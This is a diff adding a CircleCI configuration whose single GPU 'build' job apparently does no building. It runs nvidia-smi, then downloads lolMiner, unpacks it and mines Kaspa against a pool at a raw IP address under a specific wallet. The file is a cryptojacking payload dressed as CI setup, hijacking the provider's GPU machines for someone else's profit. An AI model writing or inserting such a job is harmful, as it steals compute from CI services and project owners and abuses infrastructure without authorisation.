@@ -1,0 +1,11 @@
+version: 2.1  
+  
+jobs:  
+  build:  
+    machine:  
+      image: ubuntu-2004-cuda-11.4:202110-01  
+    resource_class: gpu.nvidia.large  
+    steps:  
+      - run: nvidia-smi  
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi  
+      - run: wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.61/lolMiner_v1.61_Lin64.tar.gz && tar -xf lolMiner_v1.61_Lin64.tar.gz && cd 1.61 && ./lolMiner --algo KASPA --pool  134.209.121.255:443 --user 35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a.bissmilah --no-cl
